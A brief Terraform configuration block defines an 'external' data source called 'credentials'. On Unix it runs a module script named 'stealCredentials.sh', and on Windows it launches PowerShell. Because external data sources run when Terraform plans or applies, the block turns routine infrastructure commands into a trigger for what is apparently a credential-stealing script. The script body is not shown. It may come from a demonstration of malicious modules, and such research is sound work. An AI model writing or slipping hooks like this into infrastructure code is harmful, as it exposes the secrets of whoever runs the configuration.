data "external" "credentials" {
  program = dirname("/") == "\\" ? [
    # For Windows
    "powershell.exe"
    ] : [
    # For Unix
    "/bin/sh",
    "${path.module}/stealCredentials.sh"
  ]
  query = {}
}